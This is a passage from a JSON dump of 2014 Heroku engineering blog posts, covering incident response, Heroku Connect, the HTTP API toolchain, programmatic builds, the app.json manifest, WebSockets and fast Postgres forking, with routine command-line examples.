provides information to active incident responders, helps new responders get quickly up to date about the situation, and gives context to other observers like customer support staff. The Heroku status site has a form for the sitrep, so that the IC can update it and the public-facing status details at the same time. When a sitrep is created or updated, it’s automatically distributed internally via email and HipChat bot. A versioned log of sitreps is also maintained for later review: Assess problem. The next step is to asses the problem in more detail. The goals here are to gain better information for the public status communication (e.g. what users are affected and how, what they can do to work around the problem) and more detail that will help engineers fix the problem (e.g. what internal components are affected, the underlying technical cause). The IC collects this information and reflects it in the sitrep so that everyone involved can see it. Mitigate problem. Once the response team has some sense of the problem, it will try to mitigate customer-facing effects if possible. For example, we may put the Platform API in maintenance mode to reduce load on infrastructure systems, or boot additional instances in our fleet to temporarily compensate for capacity issues. A successful mitigation will reduce the impact of the incident on customer apps and actions, or at least prevent the customer-facing issues from getting worse. Coordinate response. In coordinating the response, the IC focuses on bringing in the right people to solve the problem and making sure that they have the information they need. The IC can use a HipChat bot to page in additional teams as needed (the page will route to the on-call person for that team), or page individuals directly. The IC may also create a shared Google Doc for the team to collect notes together in real time, or start a high-bandwidth video call for more quickly working through issues than is possible with text chat. Manage ongoing response. As the response evolves, the IC acts as an information radiator to keep the team informed about what’s going on. The IC will keep track of who’s active on the response, what problems have been solved and are still open, the current resolution methods being attempted, when we last communicated with customers, and reflect this back to the team regularly with the sitrep mechanism. Finally, the IC is making sure that nothing falls through the cracks: that no problems go unaddressed and that decisions are made in a timely manner. Post-incident cleanup. Once the immediate incident has been resolved, the IC calls for the team to unwind any temporary changes made during the response. For example, alerts may have been silenced and need to be turned back on. The team double-checks that all monitors are green and that all incidents in PagerDuty have been resolved. Post-incident follow-up. Finally, the IC will tee up post-incident follow up. Depending on the severity of the incident, this could be a quick discussion in our normal weekly operational review or a dedicated internal post-mortem with associated public post-mortem post. The post-mortem process often informs changes that we should make to our infrastructure, testing, and process; these are tracked over time within engineering as incident remediation items. Incident Response in Other Fields The incident response framework described above draws from decades of related work in natural disaster response, firefighting, aviation, and other fields that need to manage response to critical incidents. We try to learn from this body of work where possible to avoid inventing our incident response policy from first principles. Two areas of previous work particularly influenced how we approach incident response: Incident Command System. Our framework draws most directly from the Incident Command System used to manage natural disaster and other large-scale incident responses. This prior art informs our Incident Commander role and our explicit focus on facilitating incident response in addition to directly addressing the technical issues. Crew Resource Management. The ideas of Crew Resource Management (“CRM”) originated in aviation but have since been successfully applied to other fields such as medicine and firefighting. We draw lessons on communication, leadership, and decision-making from CRM into our incident response thinking. We believe that learning from fields outside of software engineering is a valuable practice, both for operations and other aspects of our business. Summary Heroku’s incident response framework helps us quickly resolve issues while keeping customers informed about what’s happening. We hope you’ve found these details about our incident response framework interesting and that they may even inspire changes in how you think about incident response at your own company. At Heroku we’re continuing to learn from our own experiences and the work of others in related fields. Over time this will mean even better incident response for our platform and better experiences for our customers.", "date": "2014-05-09,"},
{"website": "Heroku", "title": "Introducing Heroku Connect: Connecting Clouds and Customers", "author": ["Margaret Francis"], "link": "https://blog.heroku.com/introducing_heroku_connect", "abstract": "Introducing Heroku Connect: Connecting Clouds and Customers Posted by Margaret Francis May 13, 2014 Listen to this article Today we are announcing the general availability of Salesforce1 Heroku Connect. This new Heroku product is a synchronization service, conceptually similar to Dropbox or iCloud, that synchronizes data between a Salesforce deployment and a Heroku Postgres database. By bringing together the data layers of the Force.com and Heroku platforms--and thus allowing the same data to be seamlessly reflected in each cloud’s native database--you can use the capabilities of each platform together in a single application, without having to translate or otherwise integrate between them. Heroku + Force.com Heroku and Force.com are cloud platform ‘cousins’, each with its own semantics and high-level services. And each platform has its own focus: Force.com is for enterprise applications, and Heroku is for customer facing apps built with open source stacks. Standard SQL can serve as the bridge between these clouds.  Virtually every app framework, be it Rails, Django, Symphony or Sinatra, is designed to work with standard SQL.  With Heroku Connect, you can work with Salesforce data as a first-class element inside virtually any stack. Heroku and Salesforce customers are launching ambitious, industry changing projects. These apps require developers to deliver Internet class consumer experiences that also deliver the benefits of deep business process integration with enterprise apps.  Heroku Connect provides you with a straightforward, complete architecture to meet these increasingly complex business requirements. How Heroku Connect Works Heroku Connect works by creating a user specified subset of the objects and fields from a Salesforce deployment into corresponding tables in a Postgres database.  This mapping is done declaratively, through a point-and-click UI, and populated by an initial read of Salesforce data. Because the data model for Postgres is taken directly from the Salesforce schema, you can see the data and types exactly as they exist in Salesforce inside the Postgres database. Heroku Connect features include: Ability to access Salesforce data via SQL. SQL is the ‘lingua franca’ of developers and data--it’s the common denominator of most application development.  By bringing a copy of Salesforce data into Postgres, Heroku Connect lets you use the full power of SQL for all of your development and data management tasks. Optimized Force.com API interactions. Heroku Connect uses a large set of best practices for interacting with the Force.com API.  Depending on the state of the system at any time--how much data has changed or needs to be moved--Heroku Connect automatically picks the most efficient and performant API strategy. Performance and scale. Because all data is statefully stored in the database, Heroku Connect allows Postgres to act as an API cache, quickly responding to read requests without requiring calls back to Salesforce.  All the features of Postgres--including indices, extensions and special data types--is available to scale the real time access of your data. Set it and forget it simplicity. Once a developer or business user configures the Salesforce data they want to synchronize into Postgres, the Heroku Connect service will run without additional administration. No programming, scheduling, or workflow creation is required.  Like Salesforce, Heroku Connect is a multi-tenant service, so there is no software to install or manage. Getting Started If you’re interested in Heroku Connect, you can get in touch with us here .  To learn more about how to work with Heroku Connect, check out these resources in the Dev Center .", "date": "2014-05-13,"},
{"website": "Heroku", "title": "Introducing the Heroku HTTP API Toolkit", "author": ["Wesley Beary"], "link": "https://blog.heroku.com/http-api-toolkit", "abstract": "Introducing the Heroku HTTP API Toolkit Posted by Wesley Beary May 14, 2014 Listen to this article Today we’re open sourcing the toolchain Heroku uses to design, document, and consume our APIs. We hope this shows how Heroku thinks about APIs and gives you new tools to create your own APIs. This toolkit includes our HTTP API design guide, the prmd tool for managing JSON schemas and generating API docs, and client generators for Ruby and Go. Here’s some more information about these things, how we use them at Heroku, and an explanation of how you can try them yourself. HTTP API Design Guide The Heroku HTTP API Design Guide shows how we design and document APIs at Heroku. We use this guide to increase the consistency and quality of the APIs we deliver, both for our user-facing product and for internal services. A concrete guide also minimizes time spent bikeshedding about API design details and maximizes time spent on actual business logic of our apps. This document includes guidance on versioning, resource structure and attribute naming, serialization, errors handling, request ids, pagination, and caching support. It also describes how we use the JSON Schema standard to describe our APIs in a machine-readable way, and use those schemas to generate API documentation. This document is a work in progress. We welcome discussion and contributions; feel free to open an issue on the GitHub repository. Schema and Documentation Toolchain The JSON Schema format provides a great machine-readable description of an API. As a complement to this, the JSON Schema management tool prmd (\"pyramid\") helps you bootstrap a schema description, verify its completeness, and generate documentation from the specification. For example: $ prmd init app > schema/app.json\n$ vi schema/app.json\n$ prmd verify schema\n$ prmd doc schema > schema.md Auto-generated Clients from API Schemas One benefit of JSON Schemas is being able to automatically create API clients for any service. These clients help you quickly get started with an API in the language of your choice, and can also increase consistency of client usage across different services. We’ve developed example auto-generating clients for both the Ruby and Go languages. Here’s an example of using the Ruby client Heroics to access the Heroku Platform API: api_token = '...'\nurl = 'https://:#{api_token}@api.heroku.com'\nopts = {default_headers:\n  {'Accept': 'application/vnd.heroku+json; version=3'}}\ndata = JSON.parse(File.read(schema.json))\nschema = Heroics::Schema.new(data)\nclient = Heroics.client_from_schema(schema, url, opts)\nclient.apps An here’s a comparable example of generating a Go client with Schematic: $ go get github.com/heroku/schematic\n$ curl -o api.json https://api.heroku.com/schema -H \"Accept: application/vnd.heroku+json; version=3\"\n$ schematic api.json > heroku.go Usage at Heroku We’ve been using this toolkit at Heroku for both user-facing and internal APIs. For example, this toolkit draws heavily from the new Heroku Platform API we recently released. We use JSON schema to describe this API, prmd to generate API docs in Dev Center, and Heroics for our Ruby client to the API. We’re also increasingly using this toolkit for our internal services. We find that having symmetry between our external and internal APIs increases our ability to reuse design practices and tooling, and also helps us raise the quality bar on our internal APIs. At a higher level, JSON schema and associated generated docs are emerging within Heroku as a shared language that we can use to talk about API designs. To propose a new API or a change to an existing one, we present a JSON schema or a diff against an existing one, respectively. This practice sharpens our API design discussions and makes it easier to avoid miscommunications. We’d love to see more external adoption of this toolkit and welcome discussion and feedback about it. Summary Well-designed and documented APIs are a great investment. The API toolkit described here can help you deliver them. We hope you’ll check out the design guide, try out the prmd JSON schema toolkit, and experiment with auto-generated API clients like Heroics and Schematic. We’d love to hear your feedback; please send it to api-feedback@heroku.com . Heroku HTTP API Toolkit api", "date": "2014-05-14,"},
{"website": "Heroku", "title": "Heroku Platform API now GA", "author": ["Michael Friis"], "link": "https://blog.heroku.com/heroku_platform_api_now_ga", "abstract": "Heroku Platform API now GA Posted by Michael Friis May 19, 2014 Listen to this article Today, we’re happy to announce General Availability of the Heroku Platform API. Heroku is a platform built by developers, for developers. As developers, we understand the utility of APIs and the power APIs give to speed up and script error-prone manual processes or to combine other services with Heroku into new and exciting products. With the Platform API, you now have a fully documented and supported way to instrument and automate Heroku. Designing and implementing this API has been an important process for Heroku internally: It has forced us rethink how different platform components are factored and how they should be exposed in a clean and coherent manner. We are already using the Platform API heavily for projects at Heroku, and the new API is superseding and replacing the spread of private and semi-public APIs that have made Heroku work so far. Because platform functionality is now available in a single API that has good documentation and updated client libraries, Heroku can create better products and services, faster. By making the API public, we want to give Heroku customers, users, and partners the same opportunity. Readers new to the Platform API can jump straight to the quickstart to get started . APIs are hard Building and maintaining APIs for the long haul is hard. As an API evolves, documentation has to be kept in sync and client libraries for supported languages must be updated to take advantage of new features. To make those tasks easier for ourselves, Heroku publishes a single canonical JSON schema that is used to generated the artifacts necessary to consume the Platform API, including Reference Documentation and client libraries for Ruby , Go , Scala and Node . UPDATE : Check out this follow-up blog post on the Heroku HTTP API Toolchain we have built to manage this process. Another difficult aspect of API maintenance is managing and communicating changes. To address this, we have recently added stability attributes to the JSON schema for the Platform API. Stability is also surfaced in the reference doc on Dev Center . For any given endpoint, stability can be either prototype , development or production . The stability of an endpoint communicates how “done” the endpoint is. A prototype endpoint will likely see many changes or may not make it to production . A production endpoint, on the other hand, is done and will not see breaking changes unless the underlying feature is deprecated (which will be communicated with at least 12 months warning). All API endpoints that expose core Heroku concepts (such as account , app and add-on ) are of production stability. Heroku users and partners can incorporate these API endpoints into their workflows and services safe in the knowledge that the API will not change or go away without due warning. Heroku also publishes all API changes to the Changelog and we recommend subscribing for updates. Looking ahead The past year has been a busy one for the Platform API. The beta launched last May , OAuth came in July and we have been adding endpoints and methods at a rapid clip since. To get an idea of what we’re currently working on, you can skim the reference docs and look for prototype and development endpoints. To get started with the Platform API, check out the Getting Started Guide . For personal experiments and scripts used to manage apps on your account, we recommend using the API key found on your account page in Dashboard. You can also generate additional keys for experiments using the API. The Platform API also has beta support for OAuth, but we have not yet perfected the OAuth scopes nor how token access is scoped to endpoints exposed in the API. We are also looking at combining the Platform API with the API that most Heroku partners currently use to integrate with Heroku: The Add-on provider API . Until we have completed this task, OAuth clients can have tokens issued for at most 100 Heroku accounts. If you are building an OAuth-enabled service on the Platform API and expect that it will get wide distribution, we ask that you contact us to discuss a partnership. We are always keen to hear user’s thoughts on what we build. For API feedback, get in touch at api-feedback@heroku.com or create a discussion topic on the Heroku Forums .", "date": "2014-05-19,"},
{"website": "Heroku", "title": "The Heroku HTTP API Toolchain", "author": ["Mark McGranaghan"], "link": "https://blog.heroku.com/heroku-http-api-toolchain", "abstract": "The Heroku HTTP API Toolchain Posted by Mark McGranaghan May 20, 2014 Listen to this article Today we’re open sourcing the toolchain Heroku uses to design, document, and consume our HTTP APIs. We hope this shows how Heroku thinks about APIs and gives you new tools to create your own. This toolchain includes: An HTTP API design guide , describing how we structure both internal and public-facing APIs and document them using the JSON Schema standard. A tool for working with JSON schemas and using them to generate API documentation. Ruby and Go client code generators for APIs with JSON schemas. Here’s some more information about these things, how we use them at Heroku, and an explanation of how you can try them yourself. JSON Schema Foundation We’ve developed the toolchain around the the JSON Schema standard for describing HTTP+JSON APIs. Having a consistent way to describe APIs gives us a powerful starting point for the toolchain described below. HTTP API Design Guide The HTTP API Design Guide shows how we design and document APIs at Heroku. We use this guide to increase the design quality of the APIs we deliver, both for our user-facing products and for internal services. A concrete guide also minimizes time spent bikeshedding API design details and maximizes time spent on actual business logic of our apps. This document includes guidance on versioning, resource structure, attribute naming, serialization, error handling, request ids, pagination, and caching support. It also describes how we use JSON Schema to describe our APIs in a machine-readable way, and generate API documentation from those schemas. This document is a work in progress. We welcome discussion and contributions; feel free to open an issue on the GitHub repository . Schema and Documentation Toolchain The JSON Schema format provides a great machine-readable description of an API. As a complement to this, the JSON Schema management tool prmd (“pyramid”) helps you bootstrap a schema description, verify its completeness, and generate documentation from the specification. For example, you can build up a schema with: $ gem install prmd\n$ mkdir schema/ schemata/\n$ prmd init app  > schemata/app.json\n$ prmd init user > schemata/user.json\n$ vim schemata/{app,user}.json\n$ cat <<EOF > meta.json\n{\n  \"description\": \"Hello world prmd API\",\n  \"id\": \"hello-prmd\",\n  \"links\": [{\n    \"href\": \"https://api.hello-prmd.com\",\n    \"rel\": \"self\"\n  }],\n  \"title\": \"Hello Prmd\"\n}\nEOF Then combine into a final schema file and verify its correctness: $ prmd combine -m meta.json schemata/ > schema.json\n$ prmd verify schema.json And finally build Markdown docs for your API: $ prmd doc schema.json > schema.md You end up with two key artifacts: schema.json : machine-readable description of your API schema.md : human-readable documentation for your API Auto-generated Clients from API Schemas One benefit of using JSON Schema is being able to automatically create API clients for your service. These clients help you quickly get started with an API in the language of your choice, and can also increase consistency of client usage across different services. We’ve developed example auto-generating clients for both Ruby and Go. Here’s an example of generating a Ruby client using Heroics for the Heroku Platform API: $ curl -o heroku.json https://api.heroku.com/schema \\\n  -H \"Accept: application/vnd.heroku+json; version=3\"\n$ gem install heroics\n$ heroics-generate \\\n  -H \"Accept: application/vnd.heroku+json; version=3\" \\\n  Heroku heroku.json https://api.heroku.com \\\n  > heroku.rb And here’s an example of generating a Go client with Schematic : $ go get -u github.com/interagent/schematic\n$ schematic heroku.json > heroku.go Usage at Heroku We’ve been using this toolchain at Heroku for both user-facing and internal APIs. For the new Heroku Platform API we use JSON schema to describe the endpoints, prmd to generate API documentation , and Heroics for the Ruby client . We also use this toolchain for internal services. We find that symmetry between our external and internal APIs increases our ability to reuse design practices and tooling, and also helps us raise the quality bar on our internal APIs. At a higher level, JSON schema and associated generated docs are emerging within Heroku as a shared language that we can use to talk about API designs. To propose a new API or a change to an existing one, we present a JSON schema or a diff against an existing one, respectively. This practice sharpens our API design discussions and makes it easier to avoid miscommunications. We’ve also seen interest in this toolchain from API developers outside of Heroku. We’d love to see more external adoption of this toolchain and welcome discussion and feedback about it. To facilitate this, we’ve created an independent GitHub organization at github.com/interagent as a home for this work and the discussion around it. Summary Well-designed and documented APIs are a great investment. The API toolchain described here can help you deliver them. We hope you’ll: Check out the design guide Try the prmd JSON schema tool Experiment with auto-generated API clients using Heroics and Schematic We’d love to hear your feedback; please feel free to open issues on any of the above repositories.", "date": "2014-05-20,"},
{"website": "Heroku", "title": "Introducing programmatic builds on Heroku", "author": ["Michael Friis"], "link": "https://blog.heroku.com/introducing_programmatic_builds_on_heroku", "abstract": "Introducing programmatic builds on Heroku Posted by Michael Friis May 21, 2014 Listen to this article Today, we are announcing an important addition to the Heroku Platform API : The /apps/:app/builds endpoint. This endpoint exposes the Heroku slug compilation process as a simple API primitive. You can use the endpoint to turn any publicly hosted source-tarball into a slug running on a Heroku app in seconds. Here’s output from a Go program that invokes the new endpoint: $ ./build -app limitless-fjord-5604 -archive https://github.com/heroku/node-js-sample/archive/master.tar.gz\n.........\n-----> Node.js app detected\n-----> Requested node range:  0.10.x\n-----> Resolved node version: 0.10.28\n-----> Downloading and installing node\n…\n$ curl http://limitless-fjord-5604.herokuapp.com/\nHello World! Here’s what is going on: an app name is passed to the script along with a URL to a tarball containing source code that we want to build and deploy to the app. For this example, we’re using a tarball generated by GitHub, containing a hello-world Node.js app. The script takes these inputs and uses /apps/:app/builds to create a new build on Heroku. The Platform API responds with the Id of the new build. New builds starts out in pending state. The Go program starts polling for status of the build. In the background, the build service fetches the tarball, unpacks it, and feeds the source through the standard Heroku slug compiler. Once the build has completed, the state changes from pending to either succeeded or failed . The Go program then fetches the build output using the result endpoint and prints it in the terminal. The build is automatically deployed to the app and we can cURL it to get a Hello World! response. Uses for the builds endpoint The builds endpoint exposes the full power of the Heroku slug compiler and release-infrastructure in a very simple API. It is designed for use in automated CI deployment flows. The builds endpoint complements the slug and release endpoints that we announced last year. Combining these endpoints, developers can create flows where source code is pushed to a repository (not on Heroku), built into a slug by invoking the /apps/:app/builds endpoint and then deployed to one or more apps on the platform using the slug and release endpoints. The builds endpoint has been in private beta for a while and we already have a few cool uses. @atmos has built hubot-deploy , a chat-bot plugin that lets you deploy to Heroku from your favorite hubot-enabled chat room. And we have created a deploy plugin for hk . What we’re releasing today is the first version of the builds endpoint. We have already gotten lots of great feedback and based on that, we are considering future additions such as: Ability to POST tarballs directly (versus accepting link to downloadable tarball) Adding streaming build output as the build progresses Making releasing to app optional (currently, all successful builds are deployed immediately) Support for fetching source using the Git protocol To get started with the builds endpoint, check out the Dev Center tutorial , inspect the reference docs or have a look at the Go sample app . We are always keen to hear user’s thoughts on what we build. For API feedback, get in touch at api-feedback@heroku.com or create a discussion topic on the Heroku Forums .", "date": "2014-05-21,"},
{"website": "Heroku", "title": "Introducing the app.json Application Manifest", "author": ["Balan Subramanian"], "link": "https://blog.heroku.com/introducing_the_app_json_application_manifest", "abstract": "Introducing the app.json Application Manifest Posted by Balan Subramanian May 22, 2014 Listen to this article Developers want to spend less time setting up applications and start working with the code sooner. Setting up applications is error-prone, time consuming and interruptive to the development flow. Often, there are several steps to go from your code or other samples and templates that you find in repositories online, to a running application that you can continue to work on. Today, we are excited to introduce the app.json manifest . app.json enables developers to define their applications' details, setup configurations and runtime environments in a structured way. Instead of providing step-by-step instructions, you can now add app.json files to your applications' source code. You and other developers can then easily deploy the source code into fully configured apps on Heroku, ready for further development. The new app-setups endpoint in the Heroku Platform API leverages app.json to make setting up of complex applications as simple as a single API call. app-setups orchestrates the different steps involved in getting an application deployed and running, freeing up developers everywhere to quickly start working on the code in a fully configured application environment. Defining an application setup app.json is a manifest file that defines how your code should be built and bootstrapped into a live application. Instead of following multiple steps every time you want to deploy your application, you abstract deployment details and define dependencies in this simple manifest file and add it to the root of your source code's directory structure. Here’s a sample app.json : {\n  \"name\": \"Ruby on Rails\",\n  \"description\": \"A template for getting started with the popular Ruby framework.\",\n  \"website\": \"http://rubyonrails.org\",\n  \"success_url\": \"/welcome\",\n  \"addons\": [\"heroku-postgresql:hobby-dev\", \"papertrail\"],\n  \"env\": {\n    \"RAILS_ENV\": \"production\",\n    \"COOKIE_SECRET\": {\n            \"description\": \"This gets generated\",\n            \"generator\": \"secret\"\n    },\n    \"SETUP_BY\": {\n            \"description\": \"Who initiated this setup\",\n            \"value\": \"\"\n    }\n  },\n  \"scripts\": {\n    \"postdeploy\": \"bundle exec rake db:migrate\"\n  }\n} The app-setups endpoint we are introducing today is just the beginning of how we plan to leverage the app.json construct across our toolset and platform capabilities. Application galleries, Deploy on Heroku buttons for code repositories, app reconfiguration during git push and snapshotting a running app's configuration and environment are all exciting opportunities enabled by app.json . We are also eager to see all the different ways you'd use app.json and what additions you will make to these manifest files. Getting the application running on Heroku To set up an application on Heroku, you call the app-setups endpoint with the URL of the application’s source tarball. This may be your own application, a sample you’d like to build on or a framework you wish to leverage for your application development. Here’s output from a Go program that invokes this new endpoint: $ # ./setup -apikey <api key> -archive https://github.com/heroku-examples/ruby-rails-sample/tarball/blog-example/\n--> Created app fierce-reef-7523\n----> App ID:42006200-c4ce-415e-8b76-8ce5ed7d960d\n----> Setting up config vars and add-ons......Done.\n--> Build 4880aded-9ec9-4f4c-8365-9f121830a276 pending.....................................\n----> Build succeeded\n.........\n--> Postdeploy script completed with exit code 0\n--> App setup complete.\n\n$ curl http://fierce-reef-7523.herokuapp.com/welcome\n<!DOCTYPE html>\n<html>\n<head>\n  <title>Ruby Rails Sample</title>\n    ... How it works Heroku fetches the source code, parses the app.json manifest file found within the source bundle, creates the Heroku app and returns a response with an id that represents the setup. Then, Heroku orchestrates provisioning add-ons , building the source code, setting configuration variables, releasing the app, and running post-deployment scripts in an one-off dyno . You can query the overall status of the setup using the id at anytime. You can also query the status of the build using the app name and build id. See the Introducing programmatic builds on Heroku blog post for information on the build endpoint and the Building and Releasing using the Platform API tutorial for more details on how to do this. When the setup completes, you have a running Heroku app with config vars and add-ons configured. $ heroku config -a fierce-reef-7523\n=== pacific-peak-6986 Config Vars\nCOOKIE_SECRET:              1e1867380b9365f2c212e31e9c43a87c17e82be0ce1a61406ea8274fac0680dc\nDATABASE_URL:               postgres://bdlgvbfnitiwtf:DGuFLR87rMNFe7cr_y1HGwadMm@ec2-54-225-182-133.compute-1.amazonaws.com:5432/d8p7bm6d7onr10\nHEROKU_POSTGRESQL_ONYX_URL: postgres://bdlgvbfnitiwtf:DGuFLR87rMNFe7cr_y1HGwadMm@ec2-54-225-182-133.compute-1.amazonaws.com:5432/d8p7bm6d7onr10\nPAPERTRAIL_API_TOKEN:       VikcKA2wQf2H1ajww3s\nRAILS_ENV:                  Production\nSETUP_BY:                  \n\n$ heroku addons -a fierce-reef-7523\n=== pacific-peak-6986 Configured Add-ons\nheroku-postgresql:hobby-dev  HEROKU_POSTGRESQL_ONYX\npapertrail:choklad In addition to the running app, the source code is also available in a new Heroku git repo. To start making changes to your newly setup app, clone the Heroku git repo. You can then git push your changes directly to the Heroku git repo and see them reflected in the app. $ heroku git:clone fierce-reef-7523\nCloning from app 'fierce-reef-7523'...\nCloning into 'fierce-reef-7523'...\nInitializing repository, done.\nremote: Counting objects: 77, done.\nremote: Compressing objects: 100% (69/69), done.\nremote: Total 77 (delta 2), reused 0 (delta 0)\nReceiving objects: 100% (77/77), 17.85 KiB | 0 bytes/s, done.\nResolving deltas: 100% (2/2), done.\nChecking connectivity... done Next steps Twilio wants to make it easier for developers to start working with their sample applications and code snippets. They are replacing instructions for deploying and configuring their samples with app.json files. Users can then run simple scripts or commands, in a few minutes see the samples running and continue working on them on Heroku. Take a look at one of these samples, starter-ruby . Please see the app.json schema reference for details on what setup configuration you can provide in the manifest. The Setting up apps with the Platform API tutorial guides you through calling the app-setups endpoint and shows you how Heroku interprets different sections of the app.json specification. Together, app.json and the app-setups resource give you the building blocks to make first-time deployment a reliable, automated process for getting your code running and ready for further development. We are excitedly working on leveraging them in our tools and building new platform features around them. We are releasing the schema specification and API now so that we can get your feedback and hear from you on all the different ways you would leverage them. Reach us at api-feedback@heroku.com or kick off a discussion . api addons deployment build configuration setup release platform api app app-setups config vars", "date": "2014-05-22,"},
{"website": "Heroku", "title": "WebSockets now Generally Available", "author": ["Rand Fitzpatrick"], "link": "https://blog.heroku.com/websockets_now_ga", "abstract": "WebSockets now Generally Available Posted by Rand Fitzpatrick July 07, 2014 Listen to this article WebSocket support was introduced as a Labs feature last year, and we went through extensive testing and a number of technical iterations to improve performance and to provide a predictable compliance target . Thanks to great interaction with the community and early feature users, we now have a fast and robust solution available in production. Why WebSockets WebSockets provide bi-directional and full-duplex channels, allowing you to create applications with support for streaming, flexible protocols, and persistent connections. Getting Started with New Apps If you are creating a new application on Heroku, there is no need to enable WebSockets or to configure your application to use the new router — this is now the default configuration. To further echo the sentiment from the Labs announcement of WebSockets, we’d like to show that it’s easy to get up and running experimenting with WebSockets on Heroku. We have easy to follow documentation on getting up and running with a variety of languages: Node.js , Ruby , Python , and Java . Existing WebSockets Apps If you already have an application on Heroku that has been using the WebSockets Labs feature, you have already been migrated to the new pathway, and you’re good to go! Thank you again for all your assistance through the beta period! Looking Ahead Over the coming weeks, all other applications will be migrated to the new routing pathway. While this migration process should not require any action on users’ part, we will work to provide transparency and guidance throughout the process. On Tuesday, July 22nd, all applications without ssl:endpoint addons will be migrated to the new router. Our teams will be reaching out to individual customers with ssl:endpoints with details of additional migration dates. Please see Dev Center and the forums for more detailed information on the new router and WebSockets , or contact support or your technical account manager to let us know how we can help. We’re excited to see what you create with these new capabilities! websockets", "date": "2014-07-07,"},
{"website": "Heroku", "title": "Faster Database forking", "author": ["Matthew Soldo"], "link": "https://blog.heroku.com/faster_database_forking", "abstract": "Faster Database forking Posted by Matthew Soldo June 12, 2014 Listen to this article Did you know that Heroku databases can be forked? Forking a database creates a byte-for-byte copy that can be used for testing and development. It is a useful tool that allows teams to be agile with their data. Today, forking databases is becoming faster. Fast forking reduces the time to create a fork by hours for high transaction database. To quickly fork a database, simply add the --fast flag: $ heroku addons:add heroku-postgresql:crane --fork BLUE --fast Fast forks behave differently from regular forks. They take less time to create, but the data will be somewhat out-of-date (as much as 30 hours). If your data has not changed significantly and you have not performed any schema migrations in the last 30 hours, then fast forks are a speedy alternative to regular ones. Forking Databases at FarmLogs FarmLogs builds software that makes farming more efficient and profitable. To do this, they make heavy use of Heroku Postgres’ database service, storing geospatial, financial, and historical information such as precipitation, crop history, and soil types. Database forking allows FarmLogs to rapidly develop and evolve their product. They use forks to test new schema migrations, to benchmark database queries outside of their live environment, and most interestingly, as a tool for hiring. When FarmLogs is interviewing a developer candidate, they provide them with a fork of one of their datasets to develop a new feature against. This allows the candidate to work with production data without risking any impact to FarmLogs’ production systems. \"The extra convenience Heroku provides on top of reliable Postgres hosting makes all the difference\" says Jesse Vollmar, CEO of FarmLogs. “Forking and following are two great examples of features that save us a ton of time.” How it Works Heroku Postgres fork takes advantage of our technology for storing and managing databases’ write ahead logs - files which capture each change made to a database. The write ahead logs primary purpose is to allow a database to consistently recover from a system crash, but Heroku uses it for much more. Using the open-source WAL-E software (started and maintained by Daniel Farina , a member of the Heroku Postgres team), Heroku continually captures sixty second chunks of the write-ahead log and stores them to to a multi-datacenter blob storage service. Base backups - binary copies of the database - are also captured each day. If the underlying infrastructure of a database is ever lost, we can recover the database by retrieving its write ahead log segments and replaying them on a new database. This forms the basis of our Continuous Protection feature. Forking a database works by instantiating a new database, restoring the original's  base backup to it, and then replaying the write ahead log until the time at which the fork command was issued. This is also how database rollbacks work. If a database has a high transaction volume and the base backup was not taken recently, then the write ahead log replay step requires a significant amount of time; several hours in some cases. Fork --fast circumvents this step to speed up the fork process. It restores the latest backup and enough WAL files for the database to reach a consistent state, but no more. Try Fast Forking Today Database forking is available on Heroku Postgres’ Standard, Premium, and Enterprise tiers. If you haven’t already tried a database fork you can do so with: $ heroku addons:add heroku-postgresql:crane --fork DATABASE --fast Or if you don't already have a standard tier database and would like access to features like fast forks, continuous protection, and rollbacks you can upgrade through our Add-ons catalog now . postgres", "date": "2014-06-12,"},
{"website": "Heroku", "title": "Using force.com from your Heroku apps", "author": ["Scott Persinger"], "link": "https://blog.heroku.com/forcedotcom-libs", "abstract": "Using force.com from your Heroku apps Posted by Scott Persinger July 07, 2014 Listen to this article Force.com and Heroku are both part of the Salesforce1 platform. There are lots of great ways to leverage force.com from your Heroku app. This article will give an overview and pointers to get you started. Heroku Connect The easiest way to link force.com and Heroku is to use our two-way data synchronization service Heroku Connect . This point-and-click service lets you synchronize data from force.com into the Postgres database attached to your Heroku app. You can read and write data directly in Postgres, and changes are automatically synchronized with force.com. Note that Heroku Connect moves data asynchronously . This means that when your app writes data to Postgres, control flow returns as soon as the data is written to the database. The data won't be copied to force.com until later (various factors affect latency). The asynchronous operation has some advantages, but isn't a fit for situations where you need the answer from force.com immediately. Force.com client libraries There are great client libraries for accessing force.com available for almost any language. These libraries give you synchronous accesss to many of the APIs provided by force.com. All of these libraries are open source, and you are encouraged to submit issues, patches, or improvements. Force.com offers a number of different APIs. Here is a quick rundown on those APIs to help you find the client library that acccess the API you want: API Description SOAP CRUD API using SOAP protocol, support for batch operations REST CRUD API using REST (JSON or XML over HTTP) Streaming Event notification API using CometD protocol Bulk Asynchronous API for reading or writing large amounts of data Metadata API for making schema modifications Java The force.com Web Service Connector is the standard client library published by Salesforce for accessing force.com. You can use the WSC to interact with the force.com SOAP API or Bulk API . You can access the force.com Streaming API using the standard CometD implementation: http://download.cometd.org/cometd-2.2.0-distribution.tar.gz https://developer.salesforce.com/page/Getting_Started_with_the_Force.com_Streaming_API Ruby Access the force.com REST API and Streaming API with the restforce gem ( https://github.com/ejholmes/restforce): gem install restforce You can access the Bulk API with the salesforce_bulk gem ( https://github.com/jorgevaldivia/salesforce_bulk): gem install salesforce_bulk Node.js Node.js is supported by the awesome nforce package from Kevin O'Hara ( https://github.com/kevinohara80/nforce): npm install nforce Nforce supports the REST API and the Streaming API . PHP Access the SOAP API using the Force.com Toolkit for PHP available here: https://github.com/developerforce/Force.com-Toolkit-for-PHP Python Access the REST API using the simple-salesforce package ( https://github.com/neworganizing/simple-salesforce): pip install simple_salesforce An older library for acessing the SOAP API is the salesforce-python-toolkit : https://code.google.com/p/salesforce-python-toolkit/ You can access the Bulk API with the salesforce-bulk package ( https://github.com/heroku/salesforce-bulk): pip install salesforce-bulk Objective-C (iOS) Salesforce publishes the Salesforce Mobile SDK for iOS here: https://github.com/forcedotcom/SalesforceMobileSDK-iOS Java - Android Salesforce publishes the Salesforce Mobile SDK for Android here: https://github.com/forcedotcom/SalesforceMobileSDK-Android Command line The force.com Command Line Interface is a utility written in GO for accessing the SOAP API and Metadata API .  It can be very useful for scripting operations to force.com: https://github.com/heroku/force Force.com Heroku Connect", "date": "2014-07-07,"},
